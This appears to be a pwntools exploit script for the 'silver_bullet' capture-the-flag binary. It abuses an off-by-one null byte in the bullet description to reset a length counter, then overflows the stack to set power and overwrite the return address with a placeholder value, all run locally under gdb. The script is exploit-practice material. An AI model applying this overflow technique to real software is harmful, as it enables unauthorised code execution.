from pwn import *

libc = ELF('libc_32.so.6')
silver_bullet = ELF('silver_bullet')


class Prompts:
    CHOICE = 'Your choice :'
    BULLET_DESCRIPTION = 'Give me your description of bullet :'
    ANOTHER_BULLET_DESCRIPTION = 'Give me your another description of bullet :'


class Choices:
    CREATE_BULLET = '1'
    POWER_UP = '2'
    BEAT = '3'
    EXIT = '4'


def set_initial_power():
    print('[*] Setting initial power to max power - 1.')
    p.sendafter(Prompts.CHOICE, Choices.CREATE_BULLET)
    p.sendafter(Prompts.BULLET_DESCRIPTION, 'A' * 0x2f)


def reset_power():
    print('[*] Powering up by one so that the terminating nullbyte overwrites the power.')
    p.sendafter(Prompts.CHOICE, Choices.POWER_UP)
    p.sendafter(Prompts.ANOTHER_BULLET_DESCRIPTION, 'A' * 0x1)
    print('[*] Power is equal to 1 while the description buffer is full.')


def overflow_stack():
    power = 0xffffffff
    ret_addr = 0xaabbccdd
    print('[*] Setting power to beat Gin.')
    print('[*] Overriding the return address.')
    payload = p32(power) + b'AAA' + p32(ret_addr)
    p.sendafter(Prompts.CHOICE, Choices.POWER_UP)
    p.sendafter(Prompts.ANOTHER_BULLET_DESCRIPTION, payload)


def beat():
    p.sendafter(Prompts.CHOICE, Choices.BEAT)


p = gdb.debug(
    silver_bullet.path,
    '''
    # b *main+0x5b
    # b *main+0x69
    # b *main+0x7b
    c
    ''',
    env=dict(LD_PRELOAD=libc.path)
)


def main():
    set_initial_power()
    reset_power()
    overflow_stack()
    beat()


if __name__ == "__main__":
    main()
